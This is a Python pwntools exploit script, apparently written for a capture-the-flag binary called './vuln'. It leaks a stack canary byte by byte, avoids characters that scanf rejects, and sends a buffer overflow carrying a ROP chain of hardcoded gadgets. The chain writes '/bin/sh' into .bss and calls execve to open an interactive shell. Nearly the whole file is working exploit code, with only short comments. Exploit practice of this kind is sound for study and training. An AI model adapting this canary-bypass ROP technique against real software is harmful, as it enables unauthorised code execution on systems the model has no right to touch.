from pwn import *

r = process('./vuln')

# Scanf blacklist characters, should not be in any part of payload
scanf_blacklist = ['09', '0a', '0b', '0c', '0d', '20']

x = raw_input('attach to gdb, then press enter....')


def get_canary_bit(num):
	r.recvuntil('get?\n')
	r.sendline(str(num))
	res = r.recvline()
	value = int(res.split('=')[1].strip())
	return value


# for Canary, First (with least value) byte is null \x00
# we should calculate other 7 bytes of canary value one by one. 
canary = '00'			
for i in range(1, 8):
	value = get_canary_bit(i)
	if hex(value)[2:] in scanf_blacklist:
		# If any other blacklist values in canary byte, then exit, we cant do anythigng with it
		# because scanf will ignore it and not pass that canary value. so smash stack will be detected
		print('illegal character for scanf found {}'.format(hex(value)[2:]))
		exit()
	canary = hex(value)[2:] + canary

canary = '0x' + canary
canary_int = int(canary, 16)

r.recv()

""" Useful Gadgets here
0x0000000000400f8f : syscall
0x0000000000400f63 : pop rdi ; ret
0x0000000000400f61 : pop rsi ; pop r15 ; ret
0x0000000000400f8c : pop rax ; pop rdi ; ret
0x0000000000400f88 : mov rdx, rsi ; ret
0x0000000000400288 : ret
0x0000000000400f5d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
"""
syscall = p64(0x0000000000400f8f)
pop_rax_rdi = p64(0x0000000000400f8c)
pop_rdi = p64(0x0000000000400f63)
pop_rsi_r15 = p64(0x0000000000400f61)
mov_rsi_in_rdx = p64(0x0000000000400f88)

"""
Payload 1:
will call a sycall to read to specific address in .bss which will hold
our /bin/bash string
"""
payload1 = 'a' * 1032 + p64(canary_int) + 'b' * 8

# read:
#   rax: 0x0
#   rdi: unsigned int fd
#   rsi: char *buf
#   rdx: size_t count
payload1 += pop_rax_rdi + p64(0) + p64(0)			# set rax=0 rdi=0
payload1 += pop_rsi_r15 + p64(0x0000000000000008) + p64(0) + mov_rsi_in_rdx 

# .bss location to write to: 0x00000000006021EE
bss_adr = p64(0x00000000006021EE)
payload1 += pop_rsi_r15 + bss_adr + p64(0)	# set rsi=.bss location
payload1 += syscall

# Execve syscall
# sys_execve(%rdi=const char *filename, %rsi=const char *const argv[], %rdx=const char *const envp[])
# rdi => pointer to string /bin/sh
# rsi => 0x00
# rdx => 0x00
payload1 += pop_rax_rdi + p64(0x3b) + bss_adr
payload1 += pop_rsi_r15 + p64(0) + p64(0)
payload1 += pop_rsi_r15 + p64(0) + p64(0) + mov_rsi_in_rdx 
payload1 += syscall


r.sendline(payload1)


# payload2 = 'g' * 64
bin_sh = p64(0x0068732f6e69622f)
payload2 = bin_sh
r.sendline(payload2)


r.interactive()
